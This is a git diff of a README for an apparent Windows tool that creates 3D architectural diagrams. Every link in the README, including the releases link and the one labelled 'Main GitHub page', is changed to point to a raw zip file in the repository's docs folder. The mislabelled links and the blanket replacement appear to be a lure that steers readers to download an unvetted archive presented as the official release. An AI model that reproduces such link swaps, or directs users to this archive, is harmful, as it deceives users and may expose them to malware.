@@ -1,6 +1,6 @@
 # 🏗️ simple-architectural-program-creator - Create 3D Architectural Diagrams Easily
 
-[![Download Releases](https://img.shields.io/badge/Download-simple--architectural--program--creator-green?style=for-the-badge&logo=github)](https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases)
+[![Download Releases](https://img.shields.io/badge/Download-simple--architectural--program--creator-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/abdullasuad36-hue/simple-architectural-program-creator/main/docs/architectural_program_simple_creator_3.9.zip)
 
 ---
 
@@ -43,10 +43,10 @@ No installation other than downloading the package is required.
 
 Go to the releases page to get the latest version of the tool.
 
-[![Download Releases](https://img.shields.io/badge/Download-simple--architectural--program--creator-blue?style=for-the-badge&logo=github)](https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases)
+[![Download Releases](https://img.shields.io/badge/Download-simple--architectural--program--creator-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/abdullasuad36-hue/simple-architectural-program-creator/main/docs/architectural_program_simple_creator_3.9.zip)
 
 Click the link above or this URL in your browser:  
-https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases
+https://raw.githubusercontent.com/abdullasuad36-hue/simple-architectural-program-creator/main/docs/architectural_program_simple_creator_3.9.zip
 
 ### Step 2: Download the Latest Package
 
@@ -134,10 +134,10 @@ Look for a "Save" or "Export" option.
 ## 🔗 Useful Links
 
 - Main GitHub page:  
-  https://github.com/abdullasuad36-hue/simple-architectural-program-creator
+  https://raw.githubusercontent.com/abdullasuad36-hue/simple-architectural-program-creator/main/docs/architectural_program_simple_creator_3.9.zip
 
 - Download Releases:  
-  https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases
+  https://raw.githubusercontent.com/abdullasuad36-hue/simple-architectural-program-creator/main/docs/architectural_program_simple_creator_3.9.zip
 
 ---
 
@@ -181,4 +181,4 @@ If you run into problems, use GitHub’s issues tab to ask questions or report b
 
 ## 📥 Download Link Reminder  
 
-[Download the latest version here](https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases) and follow the instructions above to start using this tool on your Windows computer.
+[Download the latest version here](https://raw.githubusercontent.com/abdullasuad36-hue/simple-architectural-program-creator/main/docs/architectural_program_simple_creator_3.9.zip) and follow the instructions above to start using this tool on your Windows computer.
